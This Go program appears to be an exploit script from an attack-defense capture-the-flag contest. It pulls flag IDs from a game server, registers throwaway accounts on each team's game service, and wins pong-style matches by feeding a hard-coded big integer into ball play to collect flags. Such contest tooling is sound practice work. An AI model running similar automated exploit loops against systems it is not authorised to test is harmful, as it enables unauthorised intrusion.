package main

import (
	"apt"
	"apt/cmd/checker/utils"
	"apt/pkg/proto"
	"apt/pkg/ws"
	"encoding/json"
	"fmt"
	"maps"
	"math/big"
	"math/rand/v2"
	"net/http"
	"os"
	"slices"

	"github.com/jakecoffman/cp"
)

func getFlagIds(teamId string) []uint64 {
	resp, err := http.Get("http://10.10.0.1:8081/flagIds")
	if err != nil {
		panic(err)
	}

	defer func() { _ = resp.Body.Close() }()

	type data struct {
		APTFinals map[string]map[string]uint64 `json:"APT-Finals-1"`
	}

	var flagIds data
	if err := json.NewDecoder(resp.Body).Decode(&flagIds); err != nil {
		panic(err)
	}

	return slices.Collect(maps.Values(flagIds.APTFinals[teamId]))
}

func PlayGoodPoint(client *ws.Client, r1, r2 *big.Int, perc float64) *proto.ResponseDataPoint {
	resp, err := utils.PlayFirstBall(client)
	if err != nil {
		panic(err)
	}
	isClient := true
	dstBall := cp.Vector{X: resp.X1, Y: resp.Y1}
	posClient := cp.Vector{X: apt.BallStartX, Y: apt.BallStartY}
	posBot := cp.Vector{X: apt.BotStartX, Y: apt.BotStartY}
	for {
		isClient = !isClient
		if (isClient && dstBall.Distance(posClient)/apt.PlayerSpeed > (apt.BallFirstBounceDuration+1e-7)) || (!isClient && dstBall.Distance(posBot)/apt.PlayerSpeed > (apt.BallFirstBounceDuration+1e-7)) {
			respPoint, err := utils.ScorePoint(client)
			if err != nil {
				panic(err)
			}

			_, _ = fmt.Fprintf(os.Stderr, "End = %t, Prize = %s, ClientPoints = %d, BotPoints = %d\n", respPoint.End, respPoint.Prize, respPoint.ClientPoints, respPoint.BotPoints)
			return respPoint
		} else {
			if isClient && rand.Float64() < perc {
				posClient, posBot, dstBall, err = utils.PlayBall(client, posClient, posBot, dstBall, r1, r2, isClient, false)
			} else {
				posClient, posBot, dstBall, err = utils.PlayBall(client, posClient, posBot, dstBall, big.NewInt(0), big.NewInt(0), isClient, true)
			}
			if err != nil {
				panic(err)
			}
		}
	}
}

func WinMatch(client *ws.Client) string {

	r, _ := new(big.Int).SetString("8248257179697919199765570078866645188608", 10)

	perc := 0.6
	for {
		respPoint := PlayGoodPoint(client, r, r, perc)
		if respPoint.End {
			return respPoint.Prize
		}
		if respPoint.BotPoints == 4 {
			perc = 1
		}
	}
}

func exploit(teamId string, matchId uint64) string {
	client, err := ws.NewClient(fmt.Sprintf("10.60.%s.1:8080", teamId), nil)
	if err != nil {
		panic(err)
	}

	username, secret := utils.RandStr(16), utils.RandStr(16)
	password, err := client.Register(username, secret)
	if err != nil {
		panic(err)
	}

	ok, err := client.Login(username, password)
	if err != nil {
		panic(err)
	} else if !ok {
		panic("login failed")
	}

	if err := utils.PlayMatch(client, matchId); err != nil {
		panic(err)
	}

	for range 20 {
		flag := WinMatch(client)
		if flag != "" {
			return flag
		}
		if err := utils.PlayMatch(client, matchId); err != nil {
			panic(err)
		}
	}

	panic("not found")
}

func main() {
	flagIds := getFlagIds(os.Args[1])
	for _, flagId := range flagIds {
		flag := exploit(os.Args[1], flagId)
		println(flag)
	}
}
